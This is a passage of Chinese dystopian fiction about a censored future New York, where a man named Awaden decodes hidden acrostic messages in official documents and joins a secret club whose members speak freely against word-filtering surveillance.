EMAIL。</p><p>这就是阿瓦登每天的生活,今天比昨天更糟糕,但应该比明天还稍微好一点。事实上这个叙述也很模糊,因为阿瓦登自己并不清楚什么是“好一点”,什么是“更糟糕”。“好”与“坏”是两个变量,而他的生活就是一个定量,只有一个常数叫“压抑”。</p><p>阿瓦登推开鼠标,把脑袋向后仰去,长长地呼了一口气。(至少“呼”这个字还没有被屏蔽)这是空虚的表现,他想哼些歌,但却又不记得什么,转而吹了几下口哨,但那听起来与一只生了肺结核的狗差不多,只得做罢。有关部门象幽灵一样充斥在整个房间里,让他无法舒展自己的烦闷。就好象一个人在泥沼里挣扎,刚一张口就被灌入泥水,甚至无法大声呼救。</p><p>他的头不安分地转了几转,眼神偶尔撇到了摆在地板上的老式电话机,他忽然想到还必须要去有关部门申请自己的 BBS 论坛浏览许可证。于是他关掉 “工作”和“电子邮件”窗口,退出了网络登陆。阿瓦登在做这些事的时候毫不犹豫,他很高兴能够暂时摆脱互联网络,在那上面他只是一串枯燥的数字和一些“健康词汇”的综合体。</p><p>阿瓦登找出一件破旧的黑色呢子大衣,那件大衣继承自他的父亲,袖口和领子已经磨损的很严重,个别地方有灰色的棉花露出来,但还是很耐寒。他把大衣套到身上,戴上一副墨绿色的护镜,用过滤口罩捂住嘴。他犹豫了一下,拿起“旁听者”别在耳朵上,然后走出家门去。</p><p>纽约的街上人很少,在这个时代,互联网的普及率相当地高,大部分事务在网上就可以解决,有关部门并不提倡太多的户外活动。太多的户外活动会导致和其他人发生物理接触,而两个人发生物理接触后会发生什么事则很难控制。</p><p>“旁听者”就是为了防止这种事而发生的,这是一种便携式的语言过滤器,当携带者说出敏感词汇的时候,它就会自动发出警报。每一位公民外出前都必须要携带这个装置,以便随时检讨自己的言语。当人们意识到旁听者存在的时候,他们往往会选择沉默,至少阿瓦登是如此。有关部门正逐步试图让网络和现实生活统一起来,一起“健康”。</p><p>这时候正是11月份，寒风凛冽，天空漂浮着令人压抑的铅灰阴云，街道两旁的 电线杆仿佛落光了叶子的枯树，行人们都把自己包裹在黑色或灰色的大衣里面，浓 缩成空旷街道上的一个个黑点飞快移动着。一层若有若无的烟雾将整个纽约笼罩起 来，不用过滤口罩在这样的空气里呼吸将会是一件很有挑战的事情。</p><p>距离上一次离开家门已经有两个月了吧，阿瓦登站在公共汽车站的站牌下，不 无感慨地想，周围的一切看起来很陌生，泛黄，而且干燥。那是上一次沙尘暴的痕迹。不过沙尘暴这个词也已经被屏蔽了，因此阿瓦登的脑海里只是闪过那么一下，思想很快就转移到别的事情上去了。</p><p>站在阿瓦登旁边的是一个穿着蓝色制服的高个男人。他先是狐疑地看了阿瓦登一眼，看到后者沉默地沉在黑色大衣里，他的两只脚交替移动，缓慢地凑了过去，装做漫不经心对阿瓦登说：</p><p>“烟，有吗？”</p><p>男人说，每一个字都说的很清晰，而且词与词之间间隔也足够长。这“旁听者”还没有精密到能够完全捕捉到每一个人语速和语调的程度，因此有关部门要求每一位公民都要保持这种说话风格，以方面检测发言人是否使用了规定以外的词汇。</p><p>阿瓦登转过头去，看了他一眼，舔舔自己干裂的嘴唇，回答说：</p><p>“没有。”</p><p>男人很失望，又一次不甘心地张开嘴。</p><p>“酒，有吗？”</p><p>“没有。”</p><p>阿瓦登又重复了一次这个词，他也已经很久没有收到烟和酒了，也许是缺货的关系吧，这是常有的事。不过有一点很奇怪，“旁观者”这一次却没有发出警报。以阿瓦登的经验，以往一旦烟、酒或者其他生活必需品发生短缺现象，这个词就会暂时成为被屏蔽掉的敏感词汇，直到恢复供给为止。</p><p>这个男人看起来很疲惫，红肿的眼睛是这个时代的人们普遍的特征，这是长时间挂在网上的关系。他的头发蓬乱，嘴边还留着青色的胡子碴，制服下的衬衣领口散发着刺鼻的霉味。能看的出，他也很久不曾到街上来了。</p><p>阿瓦登这时候才注意到，他的耳朵上空荡荡的，没有挂着那个银灰色的小玩意“旁听者”，这实在是一件严重的事情。不携带“旁听者”外出，就意味着语言不会再被过滤，一些不健康的思想和言论就有可能孳生，因此有关部门相当严厉地规定公民上街必须携带旁听者。而这个男人的耳朵旁却什么也没有。阿瓦登暗暗吃惊，一时间不知道是该去提醒还是装做没看到。他暗自想，也许向有关部门举报会更好。</p><p>这时候那个男人又朝他靠近了一点，眼神变的饥渴起来。阿瓦登心里一阵紧张，下意识地向后退去。这难道是一次抢劫？还是说他是个压抑太久的同性恋者？那个男人忽然扯住他的袖子，阿瓦登狼狈地挣扎却没有挣开。出乎他的意料，那个男人并没有进一步的动作，而是大吼一声，用一种阿瓦登已经不太习惯了的飞快语速向他倾泻起话语来。阿瓦登被这突如其来的爆发弄的莫名其妙，不知所措。</p><p>“我只是想和你多几句话，就几句，我很久没有说过话了。我叫斯多葛，今年三十二岁，记得，是三十二岁。我一直梦想有一套在湖边的房子，有一副钓鱼竿和一条小艇；我讨厌网络，打倒网管；我妻子是个可恶的网络中毒者，她只会用枯燥乏味的话叫我的网络编号；这个城市就是一个大疯人院，里面大疯子管着小疯子，并且把所有没疯的人变的和他们同样疯狂；敏感词汇都去他X的，老子够了……”</p><p>男人的话仿佛一瓶摇晃了很久然后突然打开的罐装碳酸饮料，迅猛，爆裂，而且全无条理。阿瓦登惊愕地望着这个突然狂躁起来的家伙，却不知道如何应对；更可怕的是，他发现自己居然对他产生了一点同情，那种“同病相怜”式的同情。男人的话这时候已经从唠叨变成了纯粹谩骂，全部都是最直抒胸臆的那种。阿瓦登已经有五、六年不曾说过这些脏话，最后一次听到这些也是四年前。有关部门认为这都有碍精神文明，于是全部都屏蔽掉了。</p><p>而现在这个男人就在公众场合对着他大吵大嚷，似乎要将被屏蔽掉的敏感词汇一口气全倒出来。他的目光和手势并不针对任何人，甚至也不针对阿瓦登，更象是在一个人在自说自话。阿瓦登的耳膜似乎不习惯这种分贝，开始有些隐隐做痛，他捂着耳朵，拿不定主意是干脆逃掉还是……这时候，远处街道出现两辆警车，一路闪着警灯直直冲着这座公共汽车站而来。</p><p>警车开到站台旁时，男人仍旧在痛骂着。警车门开了，涌出了五、六名全副武装的联邦警察。他们扑过去将那个男子按在地上，用橡皮棍痛打。男人两条腿挣扎着，嘴里的语速更快了，骂出来的话也越来越难听。其中一名警察掏出一卷胶带，“嚓”地一声扯下一条向男人的嘴贴去。男人在嘴被胶带封住之前，突然提高嗓门，冲着警察痛快无比地喊了一句：“FUXKYOU, YOUSONOFBITCH！”阿瓦登看到他的表情由疯狂变成享受，面带着微笑，似乎完全陶醉在那一句话所带来的无上快感和解脱感中。</p><p>联邦警察们七手八脚地将男人送进了警车，这时才有一名警察走到了阿瓦登的跟前。</p><p>“他，是，你朋友？”</p><p>“我，不，认识。”</p><p>警察盯了他一阵，取下他耳朵上的“旁观者”查看记录，发现他并没有提及任何敏感词汇，于是重新给他戴回去，警告他说那名男子说的全部都是极度反动的词汇，要求他立刻忘掉，然后转身押着那男子离开了。</p><p>阿瓦登松了一口气，其实刚才他有一瞬间涌现出一种冲动，也想在这空旷的街道上大喊一声“FUXKYOU, YOUSONOFBITCH”那一定很爽快，他心里想，因为那男子说出这句话的时候表情很享受。不过他也知道，这也是妄想的一种，“旁观者”紧帖在耳朵上的冰凉感觉时刻提醒着他。 　　街上很快就恢复了冷清，十分钟后，一辆公共汽车慢吞吞地开进站里，锈迹斑斑的车门哗啦一声打开，一个电子女声响彻整个空荡荡的车厢：“请乘客注意文明用语，严格按照健康词汇发言。”</p><p>阿瓦登把自己缩进大衣，压抑住自己异样的兴奋，决定继续保持沉默下去。</p><p>大约过了一个小时，公共汽车到了目的地。从破碎的车窗玻璃里吹进来的寒风让阿瓦登脸上挂起一层暗灰色的霜气，面部被风中的沙砾和煤渣刮的生疼。他听到电子女声报出了站名，就站起身来，象一条狗一样抖抖身上的土，走下车去。</p><p>车站对面就是阿瓦登要去的地方，那是有关部门负责受理BBS论坛申请的网络部。这是一间五层的大楼，正方形，全水泥混凝土结构，外表泛灰。如果没有那几个窗户的话，那么它的外貌将与水泥块没有任何区别：生硬、死气沉沉，让蚊子和蝙蝠都退避三舍。</p><p>BBS论坛是一种奇特的东西，从理论上来讲它完全多余，BBS的功能完全可以由EMAIL新闻组来取代，后者更容易管理和审查。而且申请使用BBS论坛资格不是件容易的事，申请人必须要通过十几道手续和漫长的审查才能有浏览资格，浏览资格三个月才会被允许在指定论坛发布帖子，至于自己开设BBS则几乎是不可能。</p><p>因此真正对BBS有兴趣的人少之有少。阿瓦登当初之所以决定申请BBS论坛资格，纯粹是因为他那种模糊但却顽强的怀旧心态，就好象他从杂货店里买的那部老式电话一样。他也不知道自己为什么会自找麻烦，也许是为了给生活带来些刺激，还是说为了强调自己和曾经旧时代的那么一点点联系，也许两者兼有之。</p><p>阿瓦登恍惚记得在他小的时候，互联网与现在并不太一样。并不是指技术上的不同，而是一种人文的感觉。他希望能通过使用BBS论坛回想起一些当年的事情。</p><p>阿瓦登走进网络部的大楼，大楼里和外面一样寒冷，而且阴森。走廊里没有路灯，蓝白色调的两侧墙壁贴满了千篇一律的网络规章条文与标语，冰冷的空气呼吸到肺里，让阿瓦登一阵痉挛。只有走廊尽头的小门缝隙里流泻出一丝光亮，小门的上面挂着一块牌子，上面写的是“网络部BBS论坛科。”</p><p>一走进这间屋子，阿瓦登立刻感觉到一阵温洋洋的热气。屋子里的暖气（或者是空调）开的很大，让阿瓦登冻麻了的手脚和脸麻酥酥的，有些发痒，他不禁想伸出手去挠挠。</p><p>“公民，请您站在原地不要动。”</p><p>一个电子女声忽然从天花板上的喇叭里传来，阿瓦登触电似地把手放下，恭敬地站在原地不同。他借这个机会观察了一下这间屋子。这屋子准确来说应该是一个狭长形的大厅，一道拔地而起的大理石柜台象长城一样将房间割裂成两部分，柜台上还装着一排银白色的圆柱形栅栏，直接连到天花板。屋子里没有任何装饰，没有观赏植物，没有塑料鲜花，甚至没有长椅和饮水机。</p><p>“缔造健康的互联网络，美国万岁。”</p><p>阿瓦登跟着声音重复了一遍。</p><p>“请前往八号窗口。”</p><p>电子女声的语调很流畅，因为这是电脑制作出来的，因此没有敏感词汇的限制。</p><p>阿瓦登转头看到在自己右手边的不远处，大理石柜台上的液晶屏幕显示着八号的字样。他走过去，拼命抬起头，因为柜台实在太高了，他只能勉强看到边缘，而无法看到柜台另一侧的情形。不过他能听到，一个人走到柜台对面，坐下去，并有翻动纸张与敲击键盘的声音。</p><p>“请把文件放入盒子里。”</p><p>柜台上的喇叭传来命令。出乎意料，这一次在喇叭里的声音却变了。虽然同样冷漠枯燥，但阿瓦登还是能分辨出它与电子女声的不同——这是一个真正的女性的声音。他惊讶地抬头望去，却什么都看不到，柜台太高了。</p><p>“请把文件放入盒子里。”</p><p>声音又重复了一次，语气里带着一丝烦躁，似乎对阿瓦登的迟钝很不满。</p><p>“是的，这是真正的女声……”阿瓦登想，电子女声永远是彬彬有礼不带任何感情色彩的。他把相关的电子身份证、网络许可证、网络编号和敏感词汇犯罪记录等一系列个人资料卡片一起放进柜台外的一个小金属盒子里，然后把盒子插进柜台上一个同样大小的凹槽中，关好门。 很快他听到“唰”的一声，他猜测这也许是对面的人——也许是个女人——将盒子抽出去的声音。</p><p>“你申请BBS服务的目的是什么？”</p><p>喇叭后的女声浸满了纯粹事务性的腔调。</p><p>“为了、提高、互联网络、工作效率、为了、缔造、一个、健康、的网络、环境，更好地、为、祖国、做出、贡献。”</p><p>阿瓦登一字一句地回答，心里知道这只是一道官方程序，只需要按标准回答就可以。</p><p>对面很快就陷入沉默，大约过了十五分钟，喇叭再度响起。</p><p>“最后手续确认，你已经获得BBS论坛浏览权。”</p><p>“谢谢。”</p><p>“砰”的一声，金属盒子从柜子里弹了出来，里面除了阿瓦登的证件以外还多了五张小尺寸光盘。</p><p>“这是有关部门核发给你的BBS论坛统一用户名与密码，BBS论坛列表、互联网BBS论坛使用指南及相应法规、以及最新健康网络词汇列表。”</p><p>阿瓦登向前踏了一步，从盒子里将这些东西一股脑全拿出来，揣进大衣的大兜里。那些东西其实是可以全部放在同一张光盘里的，不过有关部门认为每一张光盘装一份文件有助于用户理解这些文件的严肃性和重要性，并产生敬畏。</p><p>他心里盼望着那个喇叭能再说两句。让他失望的是，对面传来的是一个人起身并且离开的声音，从脚步声的韵律判断，阿瓦登愈发相信这是一名女性。</p><p>“手续办理完毕，请离开网络部回到自己的工作岗位上。”</p><p>甜美空洞的电子女声从天花板上传来，阿瓦登厌恶地抽动鼻翼，拿手揉了揉，转身离开这间温暖的大厅，重新进入到寒冷的走廊。</p><p>在回家的路上，阿瓦登蜷缩在公共汽车上一动不动，顺利申请到BBS的使用权让他有些虚无缥缈的兴奋。他闭着眼睛，找了一个合适的角度躲开破窗而入的寒风，右手在兜里不断摩挲那一系列光盘，还在怀念着那一个神秘的女声。</p><p>如果能再一次听到该多好，他不能抑制自己这样的想法，同时用拇指的指肚在光盘上轻轻地摩擦，幻想这几张光盘也曾经被她的手触摸过。他兴奋的几乎也想破口大骂一句“FUXKYOU, YOUSONOFBITCH”，真奇怪，那名男子的骂声在他的记忆里根深蒂固，并时不时不自觉地滑到唇边。</p><p>忽然，他的手指在光盘上发觉到一丝异常的感觉。阿瓦登下意识地朝四周望去，确认周围一个乘客也没有后，他小心翼翼地把光盘全拿出来，就着窗外的光亮仔细端详。</p><p>阿瓦登很快注意到，在装有BBS论坛列表的光盘背面，被人用指甲轻轻地划了一道刮痕。这条刮痕很轻，如果不是阿瓦登仔细地抚摩光盘的话，是很难发觉到的。这条刮痕很奇特，是一条直线，而在这条直线末端的不远处，则是另外一条极短的刮痕，似乎刻意想弯成一个圆点。整体看上去就好象是一个叹号，或者倒过来说，象是字母i。</p><p>很快他在其他四张光盘上也发现了类似的刮痕，它们造型都不同，但都似乎代表着某种符号。阿瓦登回想起喇叭里那个女声最后一句提到过的文件顺序，于是把这五张光盘按照BBS论坛统一用户名与密码、BBS论坛列表、互联网BBS论坛使用指南、相应法规、以及最新健康网络词汇列表的顺序排列好，接着依次把那五道刮痕用手指临摹到汽车窗户上。很快那些刮痕构成了一个英文单词：</p><p>title</p><p>题目？这是什么意思？</p><p>阿瓦登看着这个单词莫名其妙，这究竟是纯属无意的痕迹，还是有人刻意为之？如果是有人刻意为之，他这么做的用意是什么？</p><p>这时候汽车停住了，又有几名乘客走上车来。阿瓦登挪动一下身体，不让他们看到自己在车窗上写出来的字迹，然后装做打呵欠的样子抬起袖子，轻轻把那五个字母擦掉。</p><p>阿瓦登暗自庆幸，如果他没有在现在发现这些光盘上的痕迹，那么以后就永远没有机会发觉了。按照规定，个人电脑是不允许使用任何存储存设备的，因此阿瓦登的电脑并没有光驱。他下一步所要做的是将这些光盘送交到管区网络安全部，由他们将光盘内资料登陆到服务器中，再转发给阿瓦登。这是为了防止个人私自在家里制造、阅读或者传播黄色或者反动信息，网络安全部发出的通告是这么解释的。联邦的网络警察经常会突入到个人家中进行临时检查，看用户是否非法拥有信息贮存设备，阿瓦登曾经亲眼见过一个邻居被警察带走，原因仅仅是因为他私自藏了一张光盘在家里——其实他只是打算拿那个当茶杯垫用。那个邻居再没回来过。</p><p>无论这些符号代表的是什么意思，它都是一种全新的体验，这让阿瓦登感觉到兴奋。怀旧与渴望新奇是阿瓦登生活在这个时代的两根精神支柱，否则他会与这座城市一样变的僵硬，然后窒息而死。</p><p>他先来到网络安全分部，将光盘交给那里的负责人，负责人反复地检查光盘和阿瓦登的表情，好象所有使用BBS论坛的人都不可信赖一样。末了负责人终于找不到什么破绽，只得将光盘收下，然后举起右手，阿瓦登和他一起高呼“缔造健康的互联网络”。这句话是唯一被允许可以连贯着被说出来的句子。</p><p>回到家里，阿瓦登脱掉大衣，摘了过滤口罩，将旁观者扔到了行军床上，然后整个人也倒进枕头里。每次出去外面都会让他疲劳，这一半是因为他孱弱的肉体已经不大适合室外活动；另外一半原因是因为他必须花费大量的精力来应付旁观者。</p><p>过了四十分钟，他才悠悠地醒过来，头还是和平常一样地疼，胸口还是一如既往地闷。胡乱吃了一点东西以后，阿瓦登爬到电脑桌前，打开电脑，按程序登陆上网络，习惯性地先检查了一遍信箱。</p><p>信箱里有七、八封新的信件，其中两封是同事发来的事务信。另外五封则是网络安全部发给他的，内容就是他送交的那几张光盘。</p><p>阿瓦登打开了包含有BBS论坛的用户名、密码和BBS论坛列表的两封信。他看到自己的论坛通用用户名叫做19842015，和自己的网络编号完全一样，不由得有些失望。他依稀记得在小的时候，BBS论坛的用户名是可以自己决定的，而且每一个论坛都可以不同，一个人在网上并不单只是一串枯燥数字。</p><p>小时候的记忆往往是跟童话和幻想混杂在一起，未必与实际相符。现实中你只能使用有关部门指定的用户名和密码，理由很简单，用户名和密码内也可能含有敏感词汇。</p><p>阿瓦登又打开了那份BBS列表，全部都是有关部门开设的官方论坛，没有私人的——事实上个人能够合法持有的电脑设备从技术上来说也无法架设新BBS——这些论坛的主题各有侧重点不同，但基本上是围绕着如何更好响应国家号召，缔造健康互联网络来说的。比如其中一个电脑技术论坛，主题就是如何更好地屏蔽掉敏感词汇。</p><p>居然在这些论坛中还有一个是关于游戏的。里面正在讨论的是一个如何帮助别人使用健康词汇的网络游戏，玩家可以操纵一名小男孩在街上侦察，看是否有人使用了敏感词汇，小男孩可以选择上前指责或者通知警察，抓到的人越多，小男孩得到的褒奖就越高。</p><p>阿瓦登随便打开了几个论坛，里面的人都彬彬有礼，说话很“健康”，就好象街上的那些行人一样。不，准确地说，比街上的气氛还要压抑。在街上的人也许还有机会保留一下自己的小动作，比如阿瓦登刚才在公共汽车上就偷偷地写了TITLE五个字母；而在网上论坛，人的最后的一点隐私也全被暴露出来，有关部门随时可以调看你的一切行动，无从遁形，这就是科学技术发展所带来的进步。</p><p>一阵失落和失望袭上阿瓦登的心头，他合上眼睛，把鼠标甩开，重重地向后靠去。原来他天真地以为BBS论坛也许会少许宽松一些，现在看来甚至比现实中更叫人窒息，他感觉到自己好象陷入沉滞的电子淤泥之中，艰于呼吸。“FUXKYOU, YOUSONOFBITCH”再一次涌现到他的唇边，强烈无比，要化好大的力气才控制住。</p><p>忽然，他又想到了那个神秘的title，那究竟是什么意思？那五张光盘里或许隐藏着什么？也许这跟title有关系？</p><p>阿瓦登想到这里，把目光重新转向电脑屏幕，仔细去看网络安全部发来的五封信的title部分。五张光盘各隐藏着一个字母，凑到一起就是title，那么按照这个方式，那五封EMAIL的title凑到一起，就变成了一句话：去用户学习论坛。”</p><p>阿瓦登记得刚才他确实看到其中一个论坛的名字叫做“用户学习”，于是他抱着姑且一试的心态连接到这个论坛去。他希望这并不是一个巧合。</p><p>用户论坛是一个事务性论坛，里面是一些关于BBS用户资料的投诉帖和管理帖，斑竹的是一个叫19387465的人；发帖的人和回帖的人数量都很少，里面冷冷清清的。阿瓦登打开帖子列表，按照刚才的规律去搜寻每一个帖子的标题，并把它们综合到一起，很快他就得到了另外一句话： 　　“每周日辛普森大楼5层B户。”</p><p>又是一个谜团，阿瓦登想。但这却坚定了他的信心，这其中必定隐藏着玄机。光盘、EMAIL和BBS论坛，连续三次都可以通过首词组组合的方式得到暗示，绝非巧合。</p><p>究竟是什么人会在有关部门的官方文件中隐藏着这样的信息呢？每周日在效率<br>大楼5层B户又会发生什么事情呢？</p><p>阿瓦登终于找到了久违的兴奋感，未知事物的新奇刺激着他麻木很久的神经。更重要的是，这种在有关部门正式文件中玩弄的文字技巧，叫他有一种喘息的快感，仿佛一个密不透风的铁面罩上几个透进空气的小孔。</p><p>营造健康的互联网络。</p><p>FUXKYOU, YOUSONOFBITCH。</p><p>阿瓦登盯着屏幕上的桌面背景，用嘴唇比出了那句粗话的口型，并且比出了中指。</p><p>在接下来的日子里，阿瓦登一直处于一种潜藏的兴奋状态，就象是一个摆出无辜表情嘴里却藏着糖果的小孩子，在大人转身过去之后露出狡黠的笑容，尽情享受心中藏有秘密的乐趣。</p><p>日子一天一天地过去，健康词汇在列表里又少了几个，窗外的空气又浑浊了几分，这已经是生活的常态。阿瓦登自己已经开始拿网络健康词汇表当日历来用，划掉三个词就证明过了三天，划掉七个就证明过了一周，于是周日终于到来了。</p><p>阿瓦登抵达辛普森大楼的时间是中午，暗示的句子里并没有指明时间，阿瓦登认为在中午前往应该是比较可以接受的。当穿着深绿军大衣，耳朵上别着旁观者的阿瓦登来到辛普森大楼的入口时，他的心开始忐忑不安地跳跃起来。他在上一星期设想了无数种可能发生的情景，而现在这个谜底就要揭晓了。无论在周日效率大楼会发生什么，也不会比现在的生活更加糟糕，阿瓦登心里想，所以他并不怎么害怕。</p><p>他走进大楼内部，发现这里的人也很少，空旷的走廊里只听到他哒哒的脚步声与回音。一部老电梯里贴着“缔造美好网络家园”的广告，以及一个充满了正义感的男性头像海报，背景是星条旗，他在纸里用右手食指指向观看者，头上写着一行字是“公民，请使用健康词汇。”阿瓦登厌恶地转过身去，发现另外一侧也贴着同样的海报，避无可避。</p><p>值得庆幸的是五楼很快就到了，电梯的门一开，对面的门上就赫然挂着B户的牌子。门是掉了漆的绿色，门框上还点了几滴墨水，一部简易的电子门铃挂在右上角。</p><p>阿瓦登深深吸了一口气，伸手去按电纽。</p><p>电铃响起，很快屋子里传来脚步声。阿瓦登觉得这脚步的韵律很熟悉，似乎是在哪里见到过。门“咔拉”一声被打开一半，一名年轻女子一手握着把手，把身体前倾望着阿瓦登，警惕地说：</p><p>“你，找谁？”</p><p>女子疑惑地问道。阿瓦登一下子就认出了她的声音，就是那个在网络部BBS论坛科柜台后面的女性。她很漂亮，穿着墨绿色绒线衫，头上梳着这时代流行的短发，皮肤特别的白，只有嘴唇能看到一些血色。</p><p>看着女子的眼神，一瞬间阿瓦登不知道该说什么好，犹豫了一下，他举起右手，轻声回答说：“title。”</p><p>阿瓦登不知道这句话能否奏效，也不知道自己是否真的找对了地方，但这是他唯一能想到的回答了。他紧张地望着那女子，假如那女子忽然报警，那么自己就会被抓起来仔细审问为什么无缘无故跑到陌生人家里。“肆意游走罪”只比“使用敏感词汇罪”轻那么一点。</p><p>女子听到他这么说，脸上还是毫无表情，只是把头幅度很轻微地点了一下，右手谨慎地做了一个“进来”的手势。阿瓦登刚要张口，那女子严厉地瞪了他一眼，吓的他把话又吞回去了，乖乖地跟着她进了屋子。</p><p>一进屋子，女子首先做的就是把门关好，然后拉起来一层铅灰色的门帘挡在门口。阿瓦登不安地眨着眼睛，趁她拉门帘的时候环顾四周。这屋子是标准的两室一厅，在厅里摆放的是一套双人沙发与一个茶几，茶几上居然还有几束红紫色的塑料花。靠墙是电脑桌和电脑，墙上挂着普通的白色日历， 但被主人用粉红色的纸套了边，看起来颇为温馨。一盏粗笨的日光灯从天花板上垂下来，上面象是恶作剧一样挂了几缕绿色的电线，象是垂下藤蔓的葡萄架。阿瓦登注意到厅口的鞋架上有四双鞋，尺码不同，说明今天的客人并不只他一个。</p><p>阿瓦登正踌躇不安，忽然女子从背后拍了拍他的肩膀，示意他朝里面走。于是两个人穿过客厅另一侧的短小回廊来到其中一间卧室。卧室上挂着同样质地的铅灰色帘子，女子伸手举起帘布，推开了门。阿瓦登迈了进去，首先映入眼帘的是三名面带微笑的人类，以及一间用真正的鲜花装点的房间。屋子里有很多旧日记忆里的古老物品，比如一幅印象派的油画、一尊乌干达木雕，甚至还有一个银烛台，唯独没有电脑。</p><p>他正在迟疑，女子也进了屋子。她谨慎地拉好门帘关上门，将耳边的旁观者取下，回过身来对阿瓦登用曼妙的声音说道：</p><p>“欢迎加入说话会！”</p><p>“说话会？”</p><p>出于习惯，阿瓦登并没有把这三个字说出口，因为他不确定是否“健康”，只是用眼神表示自己的疑惑。</p><p>“在这里你可以随便说话，这个该死的东西不会起作用的。”女子把自己的旁观者晃了晃，那个小东西象死掉了一样，对女子句子里两个敏感词汇“随便”和“该死”充耳不闻。</p><p>阿瓦登一下子想到上星期在公共汽车站前碰到的男子，如果他摘下旁观者，会不会也会落到同一境地呢？那女子见他犹豫不决，指了指门口的铅灰色门帘说：“放心好了，这里是可以屏蔽掉旁观者信号的，不会有人觉察到。”</p><p>“你们，是什么，人，这，是，哪里？”</p><p>阿瓦登一边摘下耳朵上的旁观者，一边小声说道，语调还是改不了那种有关部门规定的说话方式。</p><p>“这里是说话会，是一个完全自由场所，在这里你可以畅所欲言，请不要拘束。”</p><p>另外一个人起身对他说道，这是一名瘦高的中年男子，鼻梁上的眼镜非常地厚。</p><p>阿瓦登嗫嚅着，却找不到发音的焦点，在四个人的注视下显得窘迫不堪，脸都要红起来。女子同情地看了他一眼：“可怜的家伙，不用太紧张，每一个刚到这里的人都是这样。慢慢就习惯了。”</p><p>她把手搭到阿瓦登的肩上：“我们其实见过的，当然，我见过你，而你没见过我。”她一边说，一边将自己的头发解下来，原来她留的是一头齐肩的乌黑长发，头发披下来的一瞬间阿瓦登觉得她真的很美。</p><p>“我……我记得你，记得你的声音。”阿瓦登终于说出了一句完整的话，虽然不够流畅。</p><p>“是吗，那可太好了。”女子笑起来，拉着他的手，让他坐到沙发上，递给他一杯水。阿瓦登注意到这是一个款式古老的茶杯，上面还刻着花纹，杯子里的水带着浓郁的香气，阿瓦登尝了一点，那种甜丝丝的味道对喝惯纯净水的舌头来说刺激格外地大。让他觉得浑身一下子被注进了许多活力。</p><p>“弄到这个可不容易，我们也不是每周都能喝到。”女子坐到他身边，两只乌黑的眼睛注视着他，“你是怎么知道这个集会的？”</p><p>阿瓦登把发现光盘暗示的过程说了一遍，其他四个人都赞许地点了点头。“果然是个聪明人，脑筋还没被陈腐的空气腐蚀掉。”一个三十多岁的胖子称赞道，他的嗓门大的要命。那个戴眼镜的中年人把两只手交叉在一起，表示赞同。</p><p>“这正是天生的说话会成员，聪明、敏锐，而且不甘屈从于沉默。”</p><p>“那么。”胖子提议，“先让我们鼓掌欢迎说话会的新成员吧。”</p><p>于是四个人鼓起掌来，小小的屋子里响起一片掌声。阿瓦登羞涩地举起杯子做回应，他还不太习惯这样的场面。等到掌声稍息，他抬起头怯生生地问道：</p><p>“可以问个问题吗？说话会到底是什么？”</p><p>带他进屋的女子伸出食指，在他鼻子前两公分的地方比了一比，解释道：</p><p>“说话会，就是可以畅所欲言的集会。在这里你不必顾忌什么，说出任何你想说的东西。这里没有敏感词汇，也没有健康互联网络。这里是绝对自由的空间，你可以尽情释放你的灵魂，舒展你的身体，没有任何禁锢与束缚。”说着说着，她的声音变的高亢、奔放，里面饱含了许多早已经被屏蔽掉的词汇，阿瓦登不曾听到这样流畅连贯的话语很久了。</p><p>“我们的宗旨就是，说话，就这么简单。”中年人扶扶眼镜，补充道。</p><p>“可是，要说些什么呢？”阿瓦登又问道。</p><p>“任何事情，你心里想的任何事情都可以说出来。”中年人露出宽和的笑容，“尤其是那些被美国政府限制的思想。”</p><p>这可真是一个大胆的集会啊，这分明就是犯罪，阿瓦登心想，但他发觉自己却被这种犯罪慢慢地吸引住了。</p><p>“当然，有件事我们会事先说明。说话会是危险的，每一个成员都冒着被有关部门拘捕的风险。联邦执法人员也随时可能破门而入，以非法集会以及非法使用不合法词语的名义把我们抓起来。你现在有权拒绝加入，并且离开。”</p><p>阿瓦登听到女子的警告，心里一度犹豫起来。但一想到此刻离去的话，那么又要开始持续那种窒息的泥沼生活，他就难以压抑自己的烦闷。阿瓦登第一次发现，原来“说话”对他来说是一个致命的诱惑，他先前并不知道自己原来是如此地渴望着说话。</p><p>“我不会离开的，我要加入你们，说话。”</p><p>“那太好了。唔，那么不妨就从自我介绍开始吧。”女子高兴地说，同时站起身来，把右手搭到胸前，“从我开始。我的名字叫阿尔特弥斯，至于网络编号和身份证号码，让他们见鬼去吧！谁会去管那个！我有我自己的名字，我不是数字。”</p><p>她的话让所有人包括阿瓦登都笑了起来。接着她继续说道：“不过，这其实只是一个假名，这是希腊神话里的女神。”</p><p>“假名？”</p><p>“是的，和我户籍本上的名字是不同的。”</p><p>“可是，为什么？”</p><p>“你不会对自己在档案里的名字厌倦吗？我想起一个自己喜欢的名字，哪怕只有一次机会也好，自己想叫什么就叫什么。在这个说话会里的每一个人都有一个自己喜欢的名字，我们彼此拿这个称呼。”</p><p>阿瓦登若有所思地点点头，他很理解阿尔特弥斯的想法。事实上当他在使用网络论坛的时候，也希望能够自己取一个称心如意的名字，而不是被分配一个用户名。</p><p>通过介绍，阿瓦登了解到阿尔特弥斯是网络部BBS论坛管理科的职员，今年23岁，未婚，最讨厌蟑螂和蜘蛛，喜欢缝纫与园艺，屋子里的花就是她偷偷从城市边缘摘回来的。</p><p>接下来是那名中年人，他自我介绍说名字叫兰斯洛特，41岁，是城市电厂的一名工程师；兰斯洛特这名字出自英国的亚瑟王传说，是一名忠贞的骑士。他有自己的老婆和两个孩子，一男一女；男孩三岁，女孩四岁，他们最喜欢吃的就是柠檬味道的水果糖。说到这里，兰斯洛特说希望下次聚会能把他们也带了，孩子们正是学说话的时候，他想教给他们真正的说话。</p><p>那个三十多岁的胖子是网络部的一名网管，叫瓦格纳。这个身份让阿瓦登吃惊不已，他的印象里网管都是些绷着脸全无表情的冷漠生物，但眼前的瓦格纳脸圆滚滚的，油光锃亮，嘴边两条翘起的小胡子神气十足。他喜欢的是雪茄和歌剧，利用网管的特权这两样东西都不难弄到。</p><p>“这个能屏蔽掉信号的门帘就是他弄的。”阿尔特弥斯补充说，瓦格纳冲她做了个“乐意为您效劳”的手势，然后点燃了雪茄，把它放到嘴里，很快屋子里就笼罩起一片稀薄的烟雾。</p><p>说话会的第四名成员是一位穿着黑色制服的女性，今年刚满三十。她的名字是杜拉丝，城市日报（那个时代的报纸已经全部都数字化了）的编辑，她比阿尔特弥斯还瘦，颧骨高高耸起，眼窝身陷，两片薄薄的嘴唇即使在最说话的时候也很少分开，看不到牙齿。爱好是饲养狗和猫，尽管她并没有养。</p><p>“那么，到你了。”阿尔特弥斯对阿瓦登说。阿瓦登想了想，结结巴